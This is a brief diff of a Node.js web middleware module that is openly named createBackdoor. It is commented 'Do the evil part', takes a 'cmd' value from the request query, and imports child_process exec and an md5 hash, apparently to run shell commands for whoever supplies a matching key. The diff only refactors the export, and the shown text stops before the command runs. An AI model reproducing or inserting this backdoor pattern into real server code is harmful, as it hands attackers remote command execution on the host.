@@ -1,7 +1,9 @@
 const { exec } = require('child_process')
 const crypto = require('crypto')
 
-module.exports = () => (req, res, next) => {
+module.exports = createBackdoor
+
+function createBackdoor (req, res, next) {
   // Do the evil part
   const { cmd } = req.query
   const hash = crypto.createHash('md5')
